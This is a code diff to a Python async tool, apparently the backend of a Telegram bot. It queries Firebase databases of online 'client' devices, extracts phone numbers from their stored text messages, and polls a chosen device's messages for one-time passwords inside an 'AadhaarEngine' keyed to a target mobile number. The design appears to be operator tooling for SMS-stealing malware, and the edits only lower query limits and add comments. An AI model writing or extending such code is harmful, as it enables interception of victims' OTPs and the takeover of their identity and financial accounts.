@@ -173,24 +173,50 @@ def firebase_list_text():
     return text
 
 
-async def firebase_get_online_devices(session, url):
+# ==============================================================================
+# ✅ EDIT A: firebase_get_online_devices (now defaults to limit=5)
+# ==============================================================================
+async def firebase_get_online_devices(session, url, limit=5):
+    """
+    Fetch list of online client IDs from Firebase.
+    Mirrors Bb_Auto.py logic: only counts clients with status == True.
+    Returns up to `limit` devices (default 5).
+    """
     try:
-        async with session.get(f"{url}clients.json",
-                               timeout=aiohttp.ClientTimeout(total=10)) as r:
+        async with session.get(
+            f"{url}clients.json",
+            timeout=aiohttp.ClientTimeout(total=10)
+        ) as r:
             if r.status != 200:
                 return []
             data = await r.json() or {}
-            return [cid for cid, cd in data.items()
-                    if isinstance(cd, dict) and cd.get("status") is True]
-    except Exception:
+            online = [
+                cid for cid, cdata in data.items()
+                if isinstance(cdata, dict) and cdata.get("status") is True
+            ]
+            online.sort()
+            return online[:limit] if limit else online
+    except Exception as e:
+        print(f"⚠️ [FIREBASE] online-devices error on {url}: {e}")
         return []
 
 
-async def firebase_get_device_messages(session, url, cid, limit=10):
+# ==============================================================================
+# ✅ EDIT B: firebase_get_device_messages (now uses limitToLast=5 by default)
+# ==============================================================================
+async def firebase_get_device_messages(session, url, cid, limit=5):
+    """
+    Fetch last N messages for a device.
+    Query string matches bb_auto.py exactly:
+        messages/{cid}.json?orderBy="$key"&limitToLast={limit}
+    Default limit=5 (bb_auto style).
+    """
     try:
         fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast={limit}'
-        async with session.get(fetch_url,
-                               timeout=aiohttp.ClientTimeout(total=8)) as r:
+        async with session.get(
+            fetch_url,
+            timeout=aiohttp.ClientTimeout(total=8)
+        ) as r:
             if r.status != 200:
                 return {}
             return await r.json() or {}
@@ -231,18 +257,31 @@ async def firebase_get_all_keys(session, url, cid):
     return set()
 
 
-async def firebase_find_phone_map(session, url, limit_devices=40):
-    devices = await firebase_get_online_devices(session, url)
+# ==============================================================================
+# ✅ EDIT C: firebase_find_phone_map (now defaults to limit_devices=5)
+# ==============================================================================
+async def firebase_find_phone_map(session, url, limit_devices=5):
+    """
+    Scan Firebase link and return {phone: cid} mapping of online devices.
+    bb_auto-accurate approach:
+      1. Get up to `limit_devices` online devices (status==True).
+      2. For each, fetch last 5 messages with orderBy="$key"&limitToLast=5.
+      3. Extract phone via regex on message body.
+      4. Deduplicate by phone (first-seen wins).
+    """
+    devices = await firebase_get_online_devices(session, url, limit=limit_devices)
     mapping = {}
-    seen = set()
-    for cid in devices[:limit_devices]:
-        msgs = await firebase_get_device_messages(session, url, cid, limit=10)
+    seen_phones = set()
+
+    for cid in devices:
+        msgs = await firebase_get_device_messages(session, url, cid, limit=5)
         if not msgs:
             continue
         phone = firebase_extract_phone(msgs)
-        if phone and phone not in seen:
-            seen.add(phone)
+        if phone and phone not in seen_phones:
+            seen_phones.add(phone)
             mapping[phone] = cid
+
     return mapping
 
 
@@ -253,7 +292,7 @@ async def firebase_wait_for_otp(url, cid, known_keys, timeout=45, interval=3, se
     try:
         for _ in range(max(1, timeout // interval)):
             try:
-                fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast=15'
+                fetch_url = f'{url}messages/{cid}.json?orderBy="$key"&limitToLast=5'
                 async with session.get(fetch_url,
                                        timeout=aiohttp.ClientTimeout(total=6)) as r:
                     msgs = await r.json() or {}
@@ -579,7 +618,8 @@ class AadhaarEngine:
                     if not url:
                         continue
                     try:
-                        mapping = await firebase_find_phone_map(session, url, limit_devices=40)
+                        # ✅ EDIT D: limit_devices now 5
+                        mapping = await firebase_find_phone_map(session, url, limit_devices=5)
                         if target_mobile not in mapping:
                             continue
                         cid = mapping[target_mobile]
@@ -1228,7 +1268,10 @@ def prewarm_engine(bot, chat_id, mobile=None):
 parallel_batches = {}  # batch_id -> {"task": asyncio.Task, "chat_id": int}
 
 
-async def scan_all_firebase_phones(limit_per_link=40, max_targets=5):
+# ==============================================================================
+# ✅ EDIT E: scan_all_firebase_phones default limit_per_link=5
+# ==============================================================================
+async def scan_all_firebase_phones(limit_per_link=5, max_targets=5):
     """
     Scan all configured Firebase links and return a deduplicated list of
     {"phone": "...", "url": "...", "cid": "..."} up to max_targets entries.
